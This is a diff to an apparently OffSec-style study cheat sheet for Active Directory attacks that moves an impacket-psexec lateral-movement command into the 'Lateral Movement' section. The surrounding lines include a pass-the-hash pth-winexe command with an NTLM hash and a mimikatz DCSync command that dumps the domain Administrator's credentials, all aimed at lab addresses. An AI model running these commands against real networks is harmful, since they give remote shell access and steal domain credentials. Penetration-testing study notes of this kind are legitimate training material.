@@ -122,6 +122,10 @@ net accounts
 ```
 
 ### Lateral Movement
+###### Impacket-Psexec
+```
+impacket-psexec offsec.local/allison@192.168.151.59
+```
 ###### Pass the Hash(only for NTLM, Firewall allows SMB connection, Windows File and Print Sharing feature to be enabled)
 ```
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
@@ -189,7 +193,4 @@ Require domain admin account
 lsadump::dcsync /user:Administrator
 ```
 
-###### Impacket-Psexec
-```
-impacket-psexec offsec.local/allison@192.168.151.59
-```
+
